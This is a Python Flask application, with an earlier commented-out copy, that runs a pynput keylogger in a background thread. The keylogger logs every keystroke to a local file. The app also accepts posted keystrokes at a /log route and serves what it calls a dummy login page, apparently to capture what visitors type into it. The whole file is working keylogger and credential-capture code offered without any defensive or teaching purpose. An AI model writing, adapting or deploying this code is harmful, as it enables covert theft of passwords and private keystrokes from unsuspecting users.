# # app.py

# from flask import Flask, request
# from pynput.keyboard import Key, Listener

# app = Flask(__name__)

# count = 0
# keys = []

# def on_press(key):
#     global count, keys

#     keys.append(key)
#     count += 1
#     print(f"{key} pressed")

#     if count >= 10:
#         count = 0
#         write_file(keys)
#         keys.clear()

# def write_file(keys):
#     with open("log.txt", "a") as f:
#         for key in keys:
#             k = str(key).replace("'", "")
#             if k.find("space") > 0:
#                 f.write(" ")
#             elif k.find("enter") > 0:
#                 f.write("\n")
#             elif k.find("Key") == -1:
#                 f.write(k)

# def on_release(key):
#     if key == Key.esc:
#         return False

# # Start keylogger listener
# def start_keylogger():
#     with Listener(on_press=on_press, on_release=on_release) as listener:
#         listener.join()


# # Start keylogger in a separate thread (optional)
# import threading
# keylogger_thread = threading.Thread(target=start_keylogger)
# keylogger_thread.start()

# # Flask route to handle keystroke logging
# @app.route('/log', methods=['POST'])
# def log_keystroke():
#     key = request.json.get('key')
#     with open("log.txt", "a") as f:
#         f.write(key + "\n")
#     return "Keystroke logged successfully"

# # Flask route for serving the dummy login page
# @app.route('/')
# def dummy_login():
#     return app.send_static_file('dummy_page.html')

# if __name__ == '__main__':
#     app.run(debug=True)

from flask import Flask, request, jsonify

from pynput.keyboard import Key, Listener
import threading

app = Flask(__name__)

count = 0
keys = []

def on_press(key):
    global count,keys

    keys.append(key)
    count+=1
    print("{0} pressed ".format(key))

    if count>=10:
        count=0
        write_file(keys)
        keys=[]


def write_file(keys):
    with open("data.txt","a") as f :
        for key in keys:
            k=str(key).replace("'","")
            if k.find("space")>0:
                f.write(" ")
            elif k.find("enter")>0:
                f.write("\n")
            else:
                f.write(k)

def on_release(key):
    if key == Key.esc:
        return False

# Start keylogger listener
def start_keylogger():
    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

# Start keylogger in a separate thread (optional)
keylogger_thread = threading.Thread(target=start_keylogger)
keylogger_thread.start()

# Flask route to handle keystroke logging
@app.route('/log', methods=['POST'])
def log_keystroke():
    try:
        key = request.json.get('key')
        with open("data.txt", "a") as f:
            f.write(key + "\n")
        return jsonify({"message": "Keystroke logged successfully"}), 200
    except Exception as e:
        return jsonify({"error": str(e)}), 400

# Flask route for serving the dummy login page
@app.route('/')
def dummy_login():
    return app.send_static_file('index.html')

if __name__ == '__main__':
    app.run(debug=True)
